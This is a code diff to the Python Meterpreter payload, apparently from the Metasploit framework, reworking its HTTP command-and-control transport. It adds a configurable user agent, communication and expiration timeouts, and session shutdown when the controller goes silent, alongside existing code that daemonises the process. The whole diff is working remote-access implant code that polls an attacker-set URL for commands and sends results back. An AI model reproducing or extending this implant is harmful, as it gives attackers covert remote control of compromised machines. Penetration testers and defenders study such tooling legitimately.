@@ -19,10 +19,11 @@ else:
 	has_windll = hasattr(ctypes, 'windll')
 
 try:
+	urllib_imports = ['build_opener', 'install_opener', 'urlopen']
 	if sys.version_info[0] < 3:
-		urlopen = __import__('urllib', fromlist=['urlopen']).urlopen
+		urllib = __import__('urllib2', fromlist=urllib_imports)
 	else:
-		urlopen = __import__('urllib.request', fromlist=['urlopen']).urlopen
+		urllib = __import__('urllib.request', fromlist=urllib_imports)
 except ImportError:
 	has_urllib = False
 else:
@@ -42,8 +43,13 @@ else:
 #
 # Constants
 #
-CONNECTION_URL = None
+
+# these values may be patched, DO NOT CHANGE THEM
 DEBUGGING = False
+HTTP_COMMUNICATION_TIMEOUT = 300
+HTTP_CONNECTION_URL = None
+HTTP_EXPIRATION_TIMEOUT = 604800
+HTTP_USER_AGENT = None
 
 PACKET_TYPE_REQUEST        = 0
 PACKET_TYPE_RESPONSE       = 1
@@ -305,7 +311,7 @@ class PythonMeterpreter(object):
 		self.communications_last = 0
 		if self.socket:
 			self.driver = 'tcp'
-		elif CONNECTION_URL:
+		elif HTTP_CONNECTION_URL:
 			self.driver = 'http'
 		self.extension_functions = {}
 		self.channels = {}
@@ -314,7 +320,16 @@ class PythonMeterpreter(object):
 		for func in list(filter(lambda x: x.startswith('_core'), dir(self))):
 			self.extension_functions[func[1:]] = getattr(self, func)
 		if self.driver:
+			if hasattr(self, 'driver_init_' + self.driver):
+				getattr(self, 'driver_init_' + self.driver)()
 			self.running = True
+
+	def driver_init_http(self):
+		opener = urllib.build_opener()
+		if HTTP_USER_AGENT:
+			opener.addheaders = [('User-Agent', HTTP_USER_AGENT)]
+		urllib.install_opener(opener)
+		self._http_last_seen = time.time()
 
 	def register_function(self, func):
 		self.extension_functions[func.__name__] = func
@@ -355,10 +370,13 @@ class PythonMeterpreter(object):
 	def get_packet_http(self):
 		packet = None
 		try:
-			url_h = urlopen(CONNECTION_URL, bytes('RECV', 'UTF-8'))
+			url_h = urllib.urlopen(HTTP_CONNECTION_URL, bytes('RECV', 'UTF-8'))
 			packet = url_h.read()
 		except:
-			pass
+			if (time.time() - self._http_last_seen) > HTTP_COMMUNICATION_TIMEOUT:
+				self.running = False
+		else:
+			self._http_last_seen = time.time()
 		if packet:
 			packet = packet[8:]
 		else:
@@ -367,10 +385,13 @@ class PythonMeterpreter(object):
 
 	def send_packet_http(self, packet):
 		try:
-			url_h = urlopen(CONNECTION_URL, packet)
+			url_h = urllib.urlopen(HTTP_CONNECTION_URL, packet)
 			response = url_h.read()
 		except:
-			pass
+			if (time.time() - self._http_last_seen) > HTTP_COMMUNICATION_TIMEOUT:
+				self.running = False
+		else:
+			self._http_last_seen = time.time()
 
 	def get_packet_tcp(self):
 		packet = None
@@ -614,7 +635,7 @@ if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
 			os.setsid()
 		except OSError:
 			pass
-	if CONNECTION_URL and has_urllib:
+	if HTTP_CONNECTION_URL and has_urllib:
 		met = PythonMeterpreter()
 	else:
 		met = PythonMeterpreter(s)
